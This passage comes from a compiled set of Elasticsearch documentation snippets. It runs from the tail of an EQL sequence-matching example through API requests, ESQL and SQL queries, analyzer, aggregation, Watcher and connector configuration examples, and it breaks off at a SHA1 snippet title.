|\n// |  +-----------+     +-----------+     +------------+  |\n// |  |           |     |   [2, 4]  |     |            |  |\n// |  +-----------+     +-----------+     +------------+  |\n// +------------------------------------------------------+\n\n{ \"index\" : { \"_id\": \"6\" } }\n{ \"user\": { \"name\": \"elkbee\" }, \"process\": { \"name\": \"attrib\" }, ...}\n// Creates sequence [6] in state A for \"elkbee\".\n//\n// +-----------------------\"elkbee\"-----------------------+\n// |  +-----------+     +-----------+     +------------+  |\n// |  |  State A  |     |  State B  |     |  Complete  |  |\n// |  +-----------+     +-----------+     +------------+  |\n// |  |    [6]    |     |           |     |            |  |\n// |  +-----------+     +-----------+     +------------+  |\n// +------------------------------------------------------+\n\n{ \"index\" : { \"_id\": \"7\" } }\n{ \"user\": { \"name\": \"root\" }, \"process\": { \"name\": \"attrib\" }, ...}\n// Creates sequence [7] in state A for \"root\".\n// Sequence [2, 4] remains in state B for \"root\".\n//\n// +------------------------\"root\"------------------------+\n// |  +-----------+     +-----------+     +------------+  |\n// |  |  State A  |     |  State B  |     |  Complete  |  |\n// |  +-----------+     +-----------+     +------------+  |\n// |  |    [7]    |     |   [2, 4]  |     |            |  |\n// |  +-----------+     +-----------+     +------------+  |\n// +------------------------------------------------------+\n\n{ \"index\" : { \"_id\": \"8\" } }\n{ \"user\": { \"name\": \"elkbee\" }, \"process\": { \"name\": \"bash\" }, ...}\n// Sequence [6, 8] moves to state B for \"elkbee\".\n// State A for \"elkbee\" is now empty.\n//\n// +-----------------------\"elkbee\"-----------------------+\n// |  +-----------+     +-----------+     +------------+  |\n// |  |  State A  |     |  State B  |     |  Complete  |  |\n// |  +-----------+ --> +-----------+     +------------+  |\n// |  |           |     |   [6, 8]  |     |            |  |\n// |  +-----------+     +-----------+     +------------+  |\n// +------------------------------------------------------+\n\n{ \"index\" : { \"_id\": \"9\" } }\n{ \"user\": { \"name\": \"root\" }, \"process\": { \"name\": \"cat\" }, ...}\n// Sequence [2, 4, 9] is complete for \"root\".\n// State B for \"root\" is now empty.\n// Sequence [7] remains in state A.\n//\n// +------------------------\"root\"------------------------+\n// |  +-----------+     +-----------+     +------------+  |\n// |  |  State A  |     |  State B  |     |  Complete  |  |\n// |  +-----------+     +-----------+ --> +------------+  |\n// |  |    [7]    |     |           |     |  [2, 4, 9] |\n// |  +-----------+     +-----------+     +------------+  |\n// +------------------------------------------------------+\n\n{ \"index\" : { \"_id\": \"10\" } }\n{ \"user\": { \"name\": \"elkbee\" }, \"process\": { \"name\": \"cat\" }, ...}\n// Sequence [6, 8, 10] is complete for \"elkbee\".\n// State A and B for \"elkbee\" are now empty.\n//\n// +-----------------------\"elkbee\"-----------------------+\n// |  +-----------+     +-----------+     +------------+  |\n// |  |  State A  |     |  State B  |     |  Complete  |  |\n// |  +-----------+     +-----------+ --> +------------+  |\n// |  |           |     |           |     | [6, 8, 10] |\n// |  +-----------+     +-----------+     +------------+  |\n// +------------------------------------------------------+\n\n{ \"index\" : { \"_id\": \"11\" } }\n{ \"user\": { \"name\": \"root\" }, \"process\": { \"name\": \"cat\" }, ...}\n// Nothing happens.\n// The machines for \"root\" and \"elkbee\" remain the same.\n//\n// +------------------------\"root\"------------------------+\n// |  +-----------+     +-----------+     +------------+  |\n// |  |  State A  |     |  State B  |     |  Complete  |  |\n// |  +-----------+     +-----------+     +------------+  |\n// |  |    [7]    |     |           |     |  [2, 4, 9] |\n// |  +-----------+     +-----------+     +------------+  |\n// +------------------------------------------------------+\n//\n// +-----------------------\"elkbee\"-----------------------+\n// |  +-----------+     +-----------+     +------------+  |\n// |  |  State A  |     |  State B  |     |  Complete  |  |\n// |  +-----------+     +-----------+     +------------+  |\n// |  |           |     |           |     | [6, 8, 10] |\n// |  +-----------+     +-----------+     +------------+  |\n// +------------------------------------------------------+\n```\n\n----------------------------------------\n\nTITLE: Pipeline Simulation Request\nDESCRIPTION: Example of simulating the query helper pipeline with a natural language input.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/inference-processor.md#2025-04-21_snippet_14\n\nLANGUAGE: console\nCODE:\n```\nPOST _ingest/pipeline/query_helper_pipeline/_simulate\n{\n  \"docs\": [\n    {\n      \"_source\": {\n        \"content\": \"artificial intelligence in medicine articles published in the last 12 months\"\n      }\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Logging Action in Elasticsearch Watch\nDESCRIPTION: A logging action configuration that displays the execution date and the number of buckets in the aggregation results.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-watcher-transform-context.md#2025-04-21_snippet_10\n\nLANGUAGE: javascript\nCODE:\n```\n\"The watch was successfully executed on {{ctx.payload.human_date}} and contained {{ctx.payload.aggregations.theatres.buckets.size}} buckets\"\n```\n\n----------------------------------------\n\nTITLE: IPv6 Prefix Aggregation\nDESCRIPTION: Shows IP prefix aggregation for IPv6 addresses with a prefix length of 64 bits.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-ipprefix-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET /network-traffic/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"ipv6-subnets\": {\n      \"ip_prefix\": {\n        \"field\": \"ipv6\",\n        \"prefix_length\": 64,\n        \"is_ipv6\": true\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Querying Elasticsearch with Rule Query\nDESCRIPTION: This snippet demonstrates how to use the `rule` query in Elasticsearch to apply query rules based on specified criteria. It requires defining `ruleset_ids`, `match_criteria`, and the `organic` query. The response will contain results modified by the query rules if any match, otherwise, the organic query will be executed.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-rule-query.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"rule\": {\n      \"match_criteria\": {\n        \"user_query\": \"pugs\"\n      },\n      \"ruleset_ids\": [\"my-ruleset\"],\n      \"organic\": {\n        \"match\": {\n          \"description\": \"puggles\"\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Calculating Median and 50th Percentile of Salary in ESQL\nDESCRIPTION: This snippet demonstrates how to use the MEDIAN and PERCENTILE functions to calculate the median salary from the employees table. Both functions are used to show that they produce the same result for the 50th percentile.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/median.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| STATS MEDIAN(salary), PERCENTILE(salary, 50)\n```\n\n----------------------------------------\n\nTITLE: Removing Duplicate Tokens Using Remove Duplicates Filter in Elasticsearch\nDESCRIPTION: This snippet shows an analyze API request that adds the remove_duplicates filter to remove one of the duplicate 'dog' tokens created by the keyword_repeat and stemmer filters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-remove-duplicates-tokenfilter.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET _analyze\n{\n  \"tokenizer\": \"whitespace\",\n  \"filter\": [\n    \"keyword_repeat\",\n    \"stemmer\",\n    \"remove_duplicates\"\n  ],\n  \"text\": \"jumping dog\"\n}\n```\n\n----------------------------------------\n\nTITLE: Combining MV_MAX with MEDIAN_ABSOLUTE_DEVIATION in ESQL\nDESCRIPTION: Demonstrates how to calculate median absolute deviation on maximum values from a multivalued salary_change column, using MV_MAX as an inline function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/median_absolute_deviation.md#2025-04-21_snippet_1\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| STATS m_a_d_max_salary_change = MEDIAN_ABSOLUTE_DEVIATION(MV_MAX(salary_change))\n```\n\n----------------------------------------\n\nTITLE: Configuring Smoothing Model for Phrase Suggester in Elasticsearch\nDESCRIPTION: This snippet shows how to configure a smoothing model (Laplace in this case) for the phrase suggester to balance weights between frequent and infrequent n-grams.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-suggesters.md#2025-04-21_snippet_6\n\nLANGUAGE: console\nCODE:\n```\nPOST test/_search\n{\n  \"suggest\": {\n    \"text\" : \"obel prize\",\n    \"simple_phrase\" : {\n      \"phrase\" : {\n        \"field\" : \"title.trigram\",\n        \"size\" : 1,\n        \"smoothing\" : {\n          \"laplace\" : {\n            \"alpha\" : 0.7\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Basque Stop Words\nDESCRIPTION: Specifies the Basque stop words for Elasticsearch text analysis and links to the stop words in Lucene.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-stop-tokenfilter.md#2025-04-21_snippet_6\n\nLANGUAGE: markdown\nCODE:\n```\n`_basque_`\n:   [Basque stop words](https://github.com/apache/lucene/blob/main/lucene/analysis/common/src/resources/org/apache/lucene/analysis/eu/stopwords.txt)\n```\n\n----------------------------------------\n\nTITLE: Creating an Elasticsearch Index with English Analyzer\nDESCRIPTION: This snippet demonstrates how to create an Elasticsearch index with a text field 'content' using the English analyzer, without offsets or term vectors.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/highlighting.md#2025-04-21_snippet_29\n\nLANGUAGE: json\nCODE:\n```\nPUT test_index\n{\n  \"mappings\": {\n    \"properties\": {\n      \"content\": {\n        \"type\": \"text\",\n        \"analyzer\": \"english\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a Custom Analyzer with Common Grams Filter in Elasticsearch\nDESCRIPTION: This example shows how to configure a new custom analyzer that uses the common_grams filter with a defined list of common words (a, is, the).\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-common-grams-tokenfilter.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT /common_grams_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"index_grams\": {\n          \"tokenizer\": \"whitespace\",\n          \"filter\": [ \"common_grams\" ]\n        }\n      },\n      \"filter\": {\n        \"common_grams\": {\n          \"type\": \"common_grams\",\n          \"common_words\": [ \"a\", \"is\", \"the\" ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Converting String to Integer with CONVERT using ODBC Type\nDESCRIPTION: Example of using CONVERT with an ODBC data type (SQL_INTEGER) to convert a string to an integer.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-type-conversion.md#2025-04-21_snippet_5\n\nLANGUAGE: sql\nCODE:\n```\nSELECT CONVERT('123', SQL_INTEGER) AS int;\n\n      int\n---------------\n123\n```\n\n----------------------------------------\n\nTITLE: Configuring Docker-based Elasticsearch Connection in YAML\nDESCRIPTION: This YAML configuration snippet shows how to set up the connection to a Dockerized Elasticsearch instance, including the host, API key, and connector details for a GraphQL service.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-graphql.md#2025-04-21_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nelasticsearch.host: http://host.docker.internal:9200\nelasticsearch.api_key: <ELASTICSEARCH_API_KEY>\n\nconnectors:\n  -\n    connector_id: <CONNECTOR_ID_FROM_KIBANA>\n    service_type: graphql\n    api_key: <CONNECTOR_API_KEY_FROM_KIBANA> # Optional. If not provided, the connector will use the elasticsearch.api_key instead\n```\n\n----------------------------------------\n\nTITLE: Implementing an Adjacency Matrix Aggregation in Elasticsearch\nDESCRIPTION: This example demonstrates how to use the adjacency_matrix aggregation to analyze interactions between different groups in an email dataset. It indexes sample email data and then performs a search with an adjacency matrix to find which groups exchanged emails.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-adjacency-matrix-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT emails/_bulk?refresh\n{ \"index\" : { \"_id\" : 1 } }\n{ \"accounts\" : [\"hillary\", \"sidney\"]}\n{ \"index\" : { \"_id\" : 2 } }\n{ \"accounts\" : [\"hillary\", \"donald\"]}\n{ \"index\" : { \"_id\" : 3 } }\n{ \"accounts\" : [\"vladimir\", \"donald\"]}\n\nGET emails/_search\n{\n  \"size\": 0,\n  \"aggs\" : {\n    \"interactions\" : {\n      \"adjacency_matrix\" : {\n        \"filters\" : {\n          \"grpA\" : { \"terms\" : { \"accounts\" : [\"hillary\", \"sidney\"] }},\n          \"grpB\" : { \"terms\" : { \"accounts\" : [\"donald\", \"mitt\"] }},\n          \"grpC\" : { \"terms\" : { \"accounts\" : [\"vladimir\", \"nigel\"] }}\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Whitelist Static Imports for Composite Field Scripts in Painless\nDESCRIPTION: This snippet whitelists static imports for composite field scripts in Painless. It allows the `emit` callback to be used for collecting values for fields using `CompositeFieldScript$EmitField` and `CompositeFieldScript$EmitMap`.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.composite_field.txt#2025-04-21_snippet_2\n\nLANGUAGE: Painless\nCODE:\n```\n\"static_import {\n    # The `emit` callback to collect values for the fields\n    void emit(org.elasticsearch.script.CompositeFieldScript, String, Object) bound_to org.elasticsearch.script.CompositeFieldScript$EmitField\n    void emit(org.elasticsearch.script.CompositeFieldScript, Map) bound_to org.elasticsearch.script.CompositeFieldScript$EmitMap\n}\"\n```\n\n----------------------------------------\n\nTITLE: Calculating Total Salary Changes with Inline Function in ESQL\nDESCRIPTION: This query demonstrates the use of an inline function MV_MAX within a SUM aggregation. It calculates the sum of the maximum salary changes for each employee from the 'employees' table.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/sum.md#2025-04-21_snippet_1\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| STATS total_salary_changes = SUM(MV_MAX(salary_change))\n```\n\n----------------------------------------\n\nTITLE: Configuring Java Keystore SSL Settings in Elasticsearch\nDESCRIPTION: Configuration settings for using Java keystore files (JKS) which contain private keys, certificates, and trusted certificates in Elasticsearch. These settings define paths to keystores, passwords, and related configurations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/security-settings.md#2025-04-21_snippet_47\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.security.remote_cluster_client.ssl.keystore.path\n```\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.security.remote_cluster_client.ssl.keystore.secure_password\n```\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.security.remote_cluster_client.ssl.keystore.secure_key_password\n```\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.security.remote_cluster_client.ssl.truststore.path\n```\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.security.remote_cluster_client.ssl.truststore.secure_password\n```\n\n----------------------------------------\n\nTITLE: Highlighting English Field with Matches from Standard Field\nDESCRIPTION: Demonstrates how to highlight the 'comment.english' field while combining matches from the 'comment' field, showing the flexibility of the matched_fields parameter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/highlighting.md#2025-04-21_snippet_17\n\nLANGUAGE: json\nCODE:\n```\nGET index2/_search\n{\n  \"query\": {\n    \"query_string\": {\n      \"query\": \"running with scissors\",\n      \"fields\": [\"comment\", \"comment.english\"]\n    }\n  },\n  \"highlight\": {\n    \"order\": \"score\",\n    \"fields\": {\n      \"comment.english\": {\n        \"type\" : \"fvh\",\n        \"matched_fields\": [\"comment\"]\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Elasticsearch Snapshot in JSON\nDESCRIPTION: Initiates a snapshot of the specified index, ignoring unavailable indices and excluding global state.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/qa/repository-old-versions-compatibility/src/javaRestTest/resources/README.md#2025-04-21_snippet_13\n\nLANGUAGE: json\nCODE:\n```\nPUT /_snapshot/repository/snapshot\n{\n    \"indices\": \"index\",\n    \"ignore_unavailable\": \"true\",\n    \"include_global_state\": false\n}\n```\n\n----------------------------------------\n\nTITLE: Curly Braces Examples for Repetition in Regular Expressions\nDESCRIPTION: Examples showing how to specify exact or ranged repetition counts using curly braces notation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/regexp-syntax.md#2025-04-21_snippet_7\n\nLANGUAGE: text\nCODE:\n```\na{{2}}    # matches 'aa'\na{2,4}  # matches 'aa', 'aaa', and 'aaaa'\na{2,}   # matches 'a` repeated two or more times\n```\n\n----------------------------------------\n\nTITLE: Using SQRT Function in Elasticsearch SQL\nDESCRIPTION: Returns the square root of the input numeric expression. The function takes a numeric input and returns a double value. If null is provided, it returns null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-math.md#2025-04-21_snippet_30\n\nLANGUAGE: sql\nCODE:\n```\nSQRT(numeric_exp) <1>\n```\n\n----------------------------------------\n\nTITLE: Fetching Custom Objects via SOQL and SOSL\nDESCRIPTION: This code snippet provides an example of how to obtain documents for custom objects using SOQL and SOSL queries. The snippet outlines the expected input format and the potential output structure.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-salesforce.md#2025-04-21_snippet_8\n\nLANGUAGE: javascript\nCODE:\n```\n[\n  {\n    \"query\": \"SELECT Connector_Name, Version FROM Connector__c\",\n    \"language\": \"SOQL\"\n  },\n  {\n    \"query\": \"FIND {Salesforce} IN ALL FIELDS RETURNING Connectors__c(Id, Connector_Name, Connector_Version)\",\n    \"language\": \"SOSL\"\n  }\n]\n```\n\n----------------------------------------\n\nTITLE: Starting Elasticsearch Service\nDESCRIPTION: Starts the Elasticsearch service using systemd after configuration is complete.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-gce-usage-long.md#2025-04-21_snippet_9\n\nLANGUAGE: sh\nCODE:\n```\nsudo systemctl start elasticsearch\n```\n\n----------------------------------------\n\nTITLE: Querying Suggestions with Category Context in Elasticsearch\nDESCRIPTION: This snippet illustrates how to query suggestions using category contexts in Elasticsearch. It shows how to filter suggestions by multiple categories and specify the completion field and size of results.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-suggesters.md#2025-04-21_snippet_22\n\nLANGUAGE: console\nCODE:\n```\nPOST place/_search?pretty\n{\n  \"suggest\": {\n    \"place_suggestion\": {\n      \"prefix\": \"tim\",\n      \"completion\": {\n        \"field\": \"suggest\",\n        \"size\": 10,\n        \"contexts\": {\n          \"place_type\": [ \"cafe\", \"restaurants\" ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Internal Cluster State API Restrictions\nDESCRIPTION: Restricted internal APIs for cluster state and feature management. Use ClusterState#getMinVersions or FeatureService#clusterHasFeature instead.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/forbidden/es-server-signatures.txt#2025-04-21_snippet_7\n\nLANGUAGE: java\nCODE:\n```\norg.elasticsearch.cluster.ClusterState#compatibilityVersions()\norg.elasticsearch.cluster.ClusterFeatures#nodeFeatures()\norg.elasticsearch.cluster.ClusterFeatures#clusterHasFeature(org.elasticsearch.cluster.node.DiscoveryNodes, org.elasticsearch.features.NodeFeature)\n```\n\n----------------------------------------\n\nTITLE: Using OCTET_LENGTH Function in Elasticsearch SQL\nDESCRIPTION: Returns the length in bytes of a string input expression. Takes a string expression as input and returns null if the input is null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-string.md#2025-04-21_snippet_11\n\nLANGUAGE: sql\nCODE:\n```\nOCTET_LENGTH(string_exp) <1>\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT OCTET_LENGTH('Elastic');\n\nOCTET_LENGTH('Elastic')\n-----------------------\n7\n```\n\n----------------------------------------\n\nTITLE: Executing Watcher with Action-Specific Transform\nDESCRIPTION: This example shows a transform script applied within a specific action ('mod_log'). The script formats monetary values and creates a comma-separated string of plays. Another action ('unmod_log') does not have a transform, demonstrating that transforms can be selectively applied to individual actions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-watcher-transform-context.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPOST _watcher/watch/_execute\n{\n  \"watch\" : {\n    \"trigger\" : { \"schedule\" : { \"interval\" : \"24h\" } },\n    \"input\" : {\n      \"search\" : {\n        \"request\" : {\n          \"indices\" : [ \"seats\" ],\n          \"body\" : {\n            \"query\" : {\n              \"term\": { \"sold\": \"true\"}\n            },\n            \"aggs\" : {\n              \"theatres\" : {\n                \"terms\" : { \"field\" : \"play\" },\n                \"aggs\" : {\n                  \"money\" : {\n                    \"sum\": { \"field\" : \"cost\" }\n                  }\n                }\n              }\n            }\n          }\n        }\n      }\n    },\n    \"actions\" : {\n      \"mod_log\" : {\n        \"transform\": {                                                                <1>\n          \"script\" :\n          \"\"\"\n          def formatter = NumberFormat.getCurrencyInstance();\n          return [\n            'msg': ctx.payload.aggregations.theatres.buckets.stream()\n              .map(t-> formatter.format(t.money.value) + ' for the play ' + t.key)\n              .collect(Collectors.joining(\", \"))\n          ]\n          \"\"\"\n        },\n        \"logging\" : {\n          \"text\" : \"The output of the payload was transformed to: {{ctx.payload.msg}}\"\n        }\n      },\n      \"unmod_log\" : {                                                                 <2>\n        \"logging\" : {\n          \"text\" : \"The output of the payload was not transformed and this value should not exist: {{ctx.payload.msg}}\"\n        }\n      }\n    }\n  }\n}\n\n```\n\n----------------------------------------\n\nTITLE: Configuring SSL Keystore Settings\nDESCRIPTION: Settings for configuring Java keystores (JKS) or PKCS#12 keystores containing private keys and certificates.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/security-settings.md#2025-04-21_snippet_17\n\nLANGUAGE: properties\nCODE:\n```\nssl.keystore.path=<keystore-path>\nssl.keystore.type=jks|PKCS12\nssl.keystore.password=<password>\nssl.keystore.secure_password=<secure-password>\nssl.keystore.key_password=<key-password>\nssl.keystore.secure_key_password=<secure-key-password>\n```\n\n----------------------------------------\n\nTITLE: Creating an Index with Settings and Mappings Overrides\nDESCRIPTION: This example demonstrates creating a new index from a source while overriding specific settings and mappings. It changes the number of shards to 5 and adds a new boolean field called 'field2'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/create-index-from-source.md#2025-04-21_snippet_2\n\nLANGUAGE: json\nCODE:\n```\nPOST _create_from/my-index/my-new-index\n{\n  \"settings_override\": {\n    \"index\": {\n      \"number_of_shards\": 5\n    }\n  },\n  \"mappings_override\": {\n    \"properties\": {\n        \"field2\": { \"type\": \"boolean\" }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Reversing Unicode Characters with REVERSE in ESQL\nDESCRIPTION: Shows how the REVERSE function handles Unicode grapheme clusters correctly when reversing a string. It preserves the integrity of emoji and other complex Unicode characters during reversal.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/reverse.md#2025-04-21_snippet_1\n\nLANGUAGE: esql\nCODE:\n```\nROW bending_arts = \"💧🪨🔥💨\" | EVAL bending_arts_reversed = REVERSE(bending_arts);\n```\n\n----------------------------------------\n\nTITLE: Synopsis for elasticsearch-create-enrollment-token Command\nDESCRIPTION: The command syntax for elasticsearch-create-enrollment-token, showing available options including force, help, key-value pairs, scope, and URL specification.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/create-enrollment-token.md#2025-04-21_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nbin/elasticsearch-create-enrollment-token\n[-f, --force] [-h, --help] [-E <KeyValuePair>] [-s, --scope] [--url]\n```\n\n----------------------------------------\n\nTITLE: Running OneDrive Connector Tests with Reduced Data Size in Shell\nDESCRIPTION: To expedite the testing process, this shell command executes functional tests with a small data size. Adjusting the DATA_SIZE flag optimizes test speed while validating key functionalities.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-onedrive.md#2025-04-21_snippet_12\n\nLANGUAGE: Shell\nCODE:\n```\nmake ftest NAME=onedrive DATA_SIZE=small\n```\n\n----------------------------------------\n\nTITLE: Fetch Documents with Custom Fields\nDESCRIPTION: This example shows how to fetch documents that contain all custom fields for a specified Salesforce object using a SOQL query. The snippet addresses the query structure and expected array of results.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-salesforce.md#2025-04-21_snippet_10\n\nLANGUAGE: javascript\nCODE:\n```\n[\n  {\n    \"query\": \"SELECT FIELDS(CUSTOM) FROM Connector__c\",\n    \"language\": \"SOQL\"\n  }\n]\n```\n\n----------------------------------------\n\nTITLE: Value Count Mode Rate Aggregation\nDESCRIPTION: Shows how to use the value_count mode to calculate rates based on number of values rather than sum of values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-rate-aggregation.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nGET sales/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"by_date\": {\n      \"date_histogram\": {\n        \"field\": \"date\",\n        \"calendar_interval\": \"month\"\n      },\n      \"aggs\": {\n        \"avg_number_of_sales_per_year\": {\n          \"rate\": {\n            \"field\": \"price\",\n            \"unit\": \"year\",\n            \"mode\": \"value_count\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Subtracting Seconds from Milliseconds\nDESCRIPTION: Shows how to subtract seconds from a milliseconds-based datetime.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/using-datetime-in-painless.md#2025-04-21_snippet_10\n\nLANGUAGE: painless\nCODE:\n```\nlong milliSinceEpoch = 434931330000L;\nmilliSinceEpoch = milliSinceEpoch - 1000L*3L;\n```\n\n----------------------------------------\n\nTITLE: Displaying Supported Types for ESQL Functions in Markdown\nDESCRIPTION: This markdown table shows the supported data type combinations for left-hand side (lhs), right-hand side (rhs), and result in ESQL functions. It includes various date, numeric, and time-related data types.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/operators/types/sub.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| lhs | rhs | result |\n| --- | --- | --- |\n| date | date_period | date |\n| date | time_duration | date |\n| date_nanos | date_period | date_nanos |\n| date_nanos | time_duration | date_nanos |\n| date_period | date_nanos | date_nanos |\n| date_period | date_period | date_period |\n| double | double | double |\n| double | integer | double |\n| double | long | double |\n| integer | double | double |\n| integer | integer | integer |\n| integer | long | long |\n| long | double | double |\n| long | integer | long |\n| long | long | long |\n| time_duration | date_nanos | date_nanos |\n| time_duration | time_duration | time_duration |\n| unsigned_long | unsigned_long | unsigned_long |\n```\n\n----------------------------------------\n\nTITLE: String Length Type Mapping Table in Markdown\nDESCRIPTION: A markdown table showing the mapping between input string types, length parameter type, and result type for string length operations in ESQL.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/right.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| string | length | result |\n| --- | --- | --- |\n| keyword | integer | keyword |\n| text | integer | keyword |\n```\n\n----------------------------------------\n\nTITLE: Basic Text Expansion Query Structure in Elasticsearch\nDESCRIPTION: Shows the basic structure of a text expansion query in Elasticsearch. The query requires a sparse vector field, model ID to produce token weights, and the query text to be processed by the model.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-text-expansion-query.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET _search\n{\n   \"query\":{\n      \"text_expansion\":{\n         \"<sparse_vector_field>\":{\n            \"model_id\":\"the model to produce the token weights\",\n            \"model_text\":\"the query string\"\n         }\n      }\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Querying and Aggregating with Multi-fields in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to perform a search query using the text field, while sorting and aggregating results using the keyword field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/multi-fields.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET my-index-000001/_search\n{\n  \"query\": {\n    \"match\": {\n      \"city\": \"york\"\n    }\n  },\n  \"sort\": {\n    \"city.raw\": \"asc\"\n  },\n  \"aggs\": {\n    \"Cities\": {\n      \"terms\": {\n        \"field\": \"city.raw\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Connector with API\nDESCRIPTION: Updates an existing connector configuration with PostgreSQL details using an API call. The correct schema registration is a prerequisite.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/api-tutorial.md#2025-04-21_snippet_15\n\nLANGUAGE: json\nCODE:\n```\nPUT _connector/my-connector-id/_configuration\n{\n  \"values\": {\n    \"host\": \"127.0.0.1\",\n    \"port\": 5432,\n    \"username\": \"myuser\",\n    \"password\": \"mypassword\",\n    \"database\": \"chinook\",\n    \"schema\": \"public\",\n    \"tables\": \"album,artist\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: SHA1 Hash Computation in 